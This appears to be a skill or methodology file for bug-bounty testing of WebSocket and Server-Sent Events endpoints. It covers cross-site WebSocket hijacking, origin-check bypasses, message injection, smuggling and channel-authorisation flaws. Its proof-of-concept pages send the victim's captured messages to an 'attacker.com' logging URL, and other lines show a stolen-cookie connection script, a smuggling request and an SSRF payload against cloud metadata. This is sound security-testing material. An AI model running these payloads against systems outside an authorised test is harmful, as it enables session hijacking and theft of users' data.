---
name: websocket-security
category: vulnerabilities
description: WebSocket attacks — Cross-Site WebSocket Hijacking (CSWSH), subprotocol authentication flaws, message injection, origin header bypass, authentication smuggling via Upgrade, WebSocket smuggling, binary frame parsing bugs, and Server-Sent Events (SSE) parallels
depends_on: []
---

# WebSocket Security

WebSockets are long-lived bidirectional channels outside the normal HTTP
request/response model — same-origin policy applies differently, rate limits
are often ignored, and authentication is frequently ad-hoc. WebSocket
endpoints are consistently **under-tested** on web bounty targets.

## When to Use

- Target uses `ws://` or `wss://` for real-time features (chat, games, trading, notifications, collaborative editing)
- WebSocket-backed dashboard / monitoring UIs
- Mobile app uses WebSocket (check via mitmproxy + Frida)
- APIs accept upgrade to WebSocket (`Connection: Upgrade`)
- Server-Sent Events (SSE) — many patterns apply

## Discovery Signals

Fingerprint WebSocket presence before deep testing:

| Signal | Where to Check | What It Means |
|--------|---------------|---------------|
| `42["event",{...}]` frame prefix | DevTools WS tab | Socket.IO v4 — event-based, namespace auth often missing |
| `{"t":"d","d":{...}}` frame format | DevTools WS tab | Firebase Realtime DB — security rules may over-share subtrees (Instacart #168223) |
| `/sockjs/` or `/sockjs/info` path | Network tab, JS bundles | SockJS/Meteor DDP — classic CSWSH target, Origin rarely validated (Legal Robot #178990) |
| `/cable` endpoint + `{"type":"subscribe"}` | Network tab | ActionCable (Rails) — channel auth separate from connection auth |
| `/hubs/` or `negotiate?negotiateVersion=` | Network tab | SignalR (.NET) — hub method invocation may skip per-method auth |
| `Sec-WebSocket-Protocol: graphql-transport-ws` | Upgrade headers | GraphQL subscriptions — per-subscription auth often absent (Shopify #1023669) |
| `/ws` or `/websocket` + `{"event":...}` | Network tab | Pusher/Ably — channel authorization callbacks may be bypassable |
| `wss://*/phoenix/websocket` | Network tab | Phoenix Channels (Elixir) — topic-level auth vs socket-level auth gap |
| `Connection: Upgrade` + `101 Switching` | Proxy history | Raw WS — test every header: Origin, Cookie, Sec-WebSocket-Protocol |
| `text/event-stream` Content-Type | Response headers | SSE — same CSWSH principle, cookie-based auth, no Origin validation |
| `graphql-ws` or `subscriptions-transport-ws` | JS bundle grep | Apollo/Hasura subscriptions — introspect `Subscription` type for hidden fields |
| gRPC-Web streaming frames | Binary WS frames | gRPC-Web over WS — metadata auth tokens may not propagate to stream RPCs |

## Core Attack Classes

### 1. Cross-Site WebSocket Hijacking (CSWSH)

WebSocket handshake is a standard HTTP request. If it authenticates purely
via cookies, an attacker's page can open a WebSocket to the target **with
the victim's cookies** — full read/write as the victim.

Vulnerability conditions (all must hold):
1. WebSocket authenticates via cookies
2. Server does not validate Origin header
3. CSRF tokens / per-connection tokens absent

Exploit page:
```html
<script>
  const ws = new WebSocket("wss://target.com/ws");
  ws.onopen = () => ws.send('{"action":"get_messages"}');
  ws.onmessage = e => fetch("https://attacker.com/log?d=" + btoa(e.data));
</script>
```

Victim visits attacker page --> WebSocket opens with their cookies --> messages
exfil. No user interaction beyond visiting.

**Origin validation bypass variants** — test all of these:

| Bypass | Example Origin | Why It Works |
|--------|---------------|--------------|
| Subdomain of target | `https://evil.target.com` | Regex `target.com` matches subdomain if no anchor |
| Null origin | `Origin: null` (sandboxed iframe) | Allowlist includes `null` for file:// or data: compat |
| Missing Origin | Omit header entirely | Server skips check when header absent |
| Case variation | `https://TARGET.COM` | Case-sensitive comparison on case-insensitive domain |
| Prefix match | `https://target.com.evil.com` | Regex `.target.com` without `$` anchor |
| Trailing dot | `https://target.com.` | DNS normalizes, but string comparison may not |
| Unicode homoglyph | `https://targеt.com` | IDN rendering matches visually but fails string match |

### 2. Subprotocol Authentication Flaws

Apps sometimes authenticate via `Sec-WebSocket-Protocol`:

```
Sec-WebSocket-Protocol: token, eyJhbGci...
```

Test:
- Remove token --> accepts anonymous?
- Replay expired tokens --> check expiry?
- Inject other user's token?
- Token bruteforce (if short) — no rate limit on WS handshake usually

### 3. Authentication via Initial Message

```
WS connect (unauth) --> client sends {"auth":"<token>"} as first message
```

Vulnerabilities:
- No timeout between connect and first auth — attacker holds connection open
- Server accepts messages before auth completes
- Auth token echoed in error messages
- Token parsing tolerant of malformed input

Test:
```javascript
const ws = new WebSocket("wss://target.com/ws");
ws.onopen = () => {
  ws.send('{"action":"subscribe","channel":"admin"}');    // before auth
  ws.send('{"auth":"invalid"}');
  ws.send('{"action":"get_users"}');                       // after rejection
};
```

### 4. Message Injection / Validation Bypass

Once connected, messages rarely re-validated as thoroughly as HTTP endpoints:

- JSON field injection (fields the UI never sends)
- Type confusion (`{"user_id": [1, 2, 3]}` vs expected int)
- Very large messages (DoS)
- Nested binary frames with text-encoded payloads
- Duplicated fields (`{"role":"user","role":"admin"}`) — parser last-wins

Classic finding: UI sends `{"action":"delete_message","id":123}` with server
checking ownership. Raw WS allows:
```json
{"action":"delete_message","id":456,"as_user":"admin"}
```
Server uses `as_user` due to loose JSON schema.

### 5. Binary Frame Handling

WebSockets support text (opcode 0x1) and binary (opcode 0x2) frames. Sending
binary when text expected (or vice versa):

- Crashes / stack traces (info disclosure)
- Bypasses text-based filters (SQL keywords detected in text but not binary)
- Binary frame with embedded NUL bytes — truncation downstream
- Controllable OOB read when server uses advertised length instead of actual received bytes (Apache mod_lua #1595290)

### 6. Frame Fragmentation Abuse

WebSocket allows splitting a message across frames:

```
Frame 1: {"q":"SEL
Frame 2: ECT * FROM users"}
```

Filter looking for `SELECT` on each frame misses; DB sees full query.

### 7. HTTP-to-WebSocket Smuggling

Some reverse proxies handle Upgrade requests without fully verifying them,
creating smuggling primitives. Specific to certain proxies.

Detection:
```
POST /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Content-Length: 5

XGET /admin HTTP/1.1
Host: target.com
X:
```

### 8. Cross-Channel Auth Bleed

Apps using both HTTP API and WS. Attacker authenticates on WS with unrelated
creds --> some servers use the WS identity for HTTP requests on the same
connection.

## WebSocket Message Injection Matrix

| Framework | Wire Format | Injection Point | Technique | Impact |
|-----------|------------|----------------|-----------|--------|
| Socket.IO v4 | `42["event",{payload}]` | Event name string | Replace event name: `42["admin_broadcast",{"msg":"..."}]` | Trigger server-side handlers the UI never calls |
| SignalR (.NET) | `{"type":1,"target":"Method","arguments":[...]}` | `target` field (hub method name) | Enumerate hub methods via `{"type":1,"target":"GetAllUsers","arguments":[]}` | Invoke restricted hub methods directly |
| ActionCable (Rails) | `{"command":"subscribe","identifier":"{\"channel\":\"X\"}"}` | Channel name in `identifier` JSON | Subscribe to `AdminChannel`, `InternalChannel`, `DebugChannel` | Read admin-only broadcasts |
| Phoenix Channels | `[null,"N","topic:subtopic","phx_join",{}]` | `topic:subtopic` field | Join `admin:lobby`, `internal:metrics`, `user:OTHER_ID` | Cross-user data, admin channels |
| GraphQL-WS | `{"type":"subscribe","payload":{"query":"subscription {...}"}}` | GraphQL query in payload | Introspect schema, subscribe to `Subscription` fields hidden from UI | Per-subscription auth bypass (#1023669) |
| Meteor DDP | `{"msg":"method","method":"X","params":[...]}` | `method` name + params | Call undocumented server methods: `users.getAll`, `admin.setRole` | RPC as victim via CSWSH (#178990) |
| Firebase RTDB | `{"t":"d","d":{"r":N,"a":"p","b":{"p":"/path"}}}` | Path in `b.p` field | Subscribe to `/users`, `/admin`, `/internal` paths | Read entire DB subtrees (#168223) |
| Raw JSON WS | `{"action":"X","data":{}}` | Any field | Mass assignment: add `role`, `user_id`, `is_admin` fields | Privilege escalation, IDOR |
| Pusher/Ably | `{"event":"pusher:subscribe","data":{"channel":"private-X"}}` | Channel name | Subscribe to `private-admin`, `presence-staff`, other users' channels | Unauthorized channel access |
| gRPC-Web stream | Binary protobuf frames | Field numbers in protobuf | Modify field values in binary frames; add unexpected field numbers | Bypass validation on protobuf-typed fields |

## Channel / Topic Authorization

| Pattern | Test | What Leaks | Severity |
|---------|------|-----------|----------|
| User-scoped channels: `user:{id}` | Subscribe to `user:{other_id}` | Messages, notifications, account events for other users | High |
| Wildcard subscription | Send `subscribe:*` or `subscribe:#` (MQTT style) | All channels on the broker — full data exfil | Critical |
| Sequential channel names | Enumerate `channel_1`, `channel_2`, ... `channel_N` | Existence oracle + data if auth missing per-channel | Medium |
| Presence channels | Join `presence-{room}` without membership | User list, online status, metadata of all room members | Medium |
| Private channel auth callback bypass | Forge the `auth` field: `{channel}:{socket_id}` HMAC | Full access to private channels without server auth callback | High |
| GraphQL subscription introspection | `__schema { subscriptionType { fields { name } } }` | Hidden subscription fields not exposed in UI (#1023669) | Medium |
| Nested topic traversal | Subscribe to parent topic `org:*` instead of `org:myteam` | Cross-team data within the same org | High |
| Admin/debug channels | Try `admin`, `debug`, `internal`, `system`, `monitor` | Internal metrics, error logs, user activity (#1102780) | High |

## Reconnection / State Attacks

- **Token persistence after revocation**: WS connections often outlive the token that created them. Revoke a session token, check if the existing WS connection still receives data. Many servers only validate tokens at `connection_init`, not on each event.
- **Session confusion on reconnect**: After disconnect, client auto-reconnects with a stored token. If the token was rotated server-side (e.g., password change), the reconnect may succeed with the old token or fail into an unauthenticated state that still receives broadcasts.
- **Race conditions in handshake**: Send authenticated messages before the server processes `connection_init`. Some frameworks queue messages and process them after auth — but others process in arrival order, allowing pre-auth action.
- **Connection multiplexing**: Multiple logical sessions over one WS connection (Socket.IO namespaces, SignalR hub groups). Auth may be checked for the first namespace but not for subsequent joins on the same socket.
- **Stale subscription after role change**: User A subscribes to `admin` channel while admin. A's role is downgraded. The existing subscription continues delivering admin events because the server checked auth at subscribe-time, not per-event.

## Dual-Path Sanitization Gap

When an app has both HTTP API and WebSocket delivery for the same data, each
path must sanitize independently. The Mattermost finding (#2541027) showed:
- **Database/REST path**: properly strips user-supplied metadata
- **WebSocket broadcast path**: sends user-supplied metadata verbatim

Test: create content via API with injected fields (XSS payloads, spoofed
`user_id`, type-confused values). Compare what the REST GET returns vs what
the WebSocket broadcast delivers. Any field present in WS but absent from
REST is a sanitization gap.

## Defense-Bypass Pairs

| Defense | Bypass | How to Test |
|---------|--------|------------|
| Origin header allowlist | `null` origin via sandboxed iframe: `<iframe sandbox="allow-scripts" src="data:text/html,...">` | Serve CSWSH PoC from sandboxed iframe, check if `null` is accepted |
| Per-connection CSRF token | Token leaked in JS bundle, error message, or WS frame itself | Grep JS for token generation; inspect WS error responses for token echo |
| Cookie-based auth on Upgrade | SameSite=Lax allows top-level navigation; use `window.open()` | Open target in new window (top-level nav), then `new WebSocket()` from opener |
| Rate limiting on HTTP but not WS | Switch identical requests to WS channel | Replay the same action over WS; if no rate limit, report as bypass |
| WAF/IDS on HTTP payloads | Frame fragmentation splits payload across WS frames | Split injection payload across 2+ frames; reassembled server-side but WAF scans per-frame |
| Text-frame content filter (SQLi/XSS) | Send same payload as binary frame (opcode 0x2) | Toggle frame type in wscat/websocat; binary frames often skip text filters |
| Auth at connection, not per-message | Downgrade role after connection established; WS still delivers | Change user role mid-session; check if existing WS continues receiving privileged events |
| Server-side field mask / projection | Undocumented boolean flags override the mask (#922197504 pattern) | Add `includeAll=true`, `includeSuspended=true`, `expand=full` to WS messages |

## Chain Patterns

| Chain | Step 1 | Step 2 | Impact | Real-World Ref |
|-------|--------|--------|--------|---------------|
| CSWSH --> data theft | Open cross-origin WS with victim cookies | Subscribe to victim's private channels, exfil messages | Full account data exfiltration | Legal Robot #178990 |
| WS broadcast --> IDOR | Observe WS frames for foreign user IDs/object IDs | Replay those IDs against REST API endpoints | Horizontal privilege escalation | Instacart #168223 (Firebase user IDs) |
| WS injection --> stored XSS | Inject HTML/JS in WS message field the server broadcasts | All connected clients render the payload | Mass client-side compromise | Mattermost #2541027 (metadata spoofing) |
| WS --> SSRF | WS message includes URL parameter server fetches | Supply `http://169.254.169.254/latest/meta-data/` | Cloud metadata theft, internal network scan | Common in chat link-preview features |
| Pre-auth WS --> account enum | Connect WS without auth, send login attempts | Observe distinct error messages for valid vs invalid users | Username/email enumeration at scale, no rate limit | Meteor DDP login method pattern |
| WS event leak --> ATO chain | Low-priv WS subscription leaks password-reset tokens or session IDs | Replay leaked token against password-reset or session endpoint | Account takeover of any user | Shopify Ping #1023669 (data leak via subscription) |
| SPA route bypass --> WS data leak | Fragment/query manipulation renders protected SPA view | SPA opens WS connection without server-validated session | Unauthenticated access to real-time dashboard data | Nextcloud #1102780 |
| Dual-path gap --> phishing | Spoof `user_id` in WS broadcast to impersonate admin/system | Victims see fake system message with malicious link in real-time | Social engineering within trusted platform | Mattermost #2541027 (user spoofing) |

## Methodology

### Phase 1: Discovery

```javascript
// DevTools console — find every WebSocket the target uses
const _OrigWS = window.WebSocket;
window.WebSocket = function(url, ...a) {
  console.log("WS:", url);
  return new _OrigWS(url, ...a);
};
```

Or grep JS bundles (see `js_analysis.md`):
```bash
grep -rhoE '"(ws{1,2}://|wss?://)[^"]+"' js_dump/*.js | sort -u
```

### Phase 2: Capture + Modify

Use Burp (Proxy --> WebSockets history --> Repeat) or Caido WS intercept.

```python
import asyncio, websockets, json

async def test():
    async with websockets.connect(
        "wss://target.com/ws",
        origin="https://evil.com",
        extra_headers={"Cookie": "session=STOLEN"}
    ) as ws:
        await ws.send(json.dumps({"action":"probe"}))
        print(await ws.recv())

asyncio.run(test())
```

### Phase 3: CSWSH + Origin Test

1. Get authenticated WS connection working in browser
2. Build minimal HTML PoC on ANOTHER origin (test all Origin bypass variants from table above)
3. Open PoC while logged in to target — did WS authenticate with your cookies?
4. In Burp WS repeater: strip `Sec-WebSocket-Protocol` auth token, test `null` and missing Origin

### Phase 4: Message Fuzzing + Cross-User

For each message type the UI sends, replay with: extra fields (mass assignment), type changes (int --> array), missing fields, duplicated fields, injection payloads, large values.

Connect as User A and target User B's resources:
- `{"action":"get_message","id":<B's message id>}`
- `{"action":"send","channel":"<B's private channel>"}`

## Server-Sent Events (SSE) — Same Patterns

SSE is one-way (server --> client) over HTTP, but similar issues:

- Same-origin auth --> cross-site hijacking (SSE equivalent of CSWSH)
- Origin-less requests accepted
- Long-lived connections --> credential replay

```javascript
const es = new EventSource("https://target.com/events");
es.onmessage = e => fetch("https://attacker.com/log?d=" + btoa(e.data));
```

Differences:
- SSE uses `Content-Type: text/event-stream`, no Upgrade
- No binary frames, no client-to-server messages (aside from new EventSource)

## Key Commands

```bash
# websocat — manual WS test
pipx install websocat 2>/dev/null || cargo install websocat
echo '{"action":"probe"}' | websocat wss://target.com/ws

# With headers
websocat --header "Origin: https://evil.com" \
         --header "Cookie: session=..." \
         wss://target.com/ws

# Persistent interactive
websocat -v wss://target.com/ws

# WS smuggling detection
curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Upgrade: websocket" -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  "https://target.com/ws"
```

## What to Look For

- Origin header absent from server-side validation --> CSWSH
- Cookie-only auth on WS --> CSWSH candidate
- WS authenticates after some messages processed --> pre-auth action
- Messages missing server-side authorization --> horizontal/vertical escalation
- Server accepts Binary frames on text-only endpoints --> filter bypass
- Large message limits absent --> DoS
- Echoes of auth tokens in error messages --> token leak
- Different auth semantics for WS vs HTTP --> bleed
- REST response differs from WS broadcast for same data --> dual-path sanitization gap
- WS frames contain IDs/fields not shown in UI --> IDOR primitive or info disclosure

## Tips

1. CSWSH is easy to miss — always test from a different origin; use a sandboxed iframe for `null` Origin
2. WS auth often relies on "pre-auth message" — test what commands the server accepts before auth completes
3. Binary frame vs text frame confusion — many apps crash or bypass filters; also test advertised-length vs actual-length mismatch for memory disclosure
4. Enumerate WS message types from JS bundle — `js_analysis.md` finds them all; grep for `socket.emit`, `send(JSON`, `hub.invoke`
5. Per-message mass assignment — like HTTP mass assignment but almost NEVER tested; add `role`, `is_admin`, `user_id` fields
6. Long-lived connection + token rotation gap — revoke a token and check if the WS session survives; many servers only check at connect time
7. Subscription channels — subscribing to other users' private channels is instant Critical; try `user:{other_id}`, `admin`, `debug`, `internal`
8. WS rate limits usually missing — spam 10k messages/sec; if HTTP rate limits exist, test if the same action via WS is unlimited
9. Mobile apps LOVE WebSockets — intercept with mitmproxy + Frida; mobile WS often has weaker auth than web
10. For SSE-specific bugs, same CSWSH principle applies — `EventSource` sends cookies cross-origin by default
11. Dual-path sanitization: always compare REST GET vs WS broadcast for the same object — a mismatch means one path skips validation (#2541027)
12. GraphQL subscriptions: introspect the `Subscription` type and try every field as a low-priv user — per-subscription auth is frequently absent (#1023669)
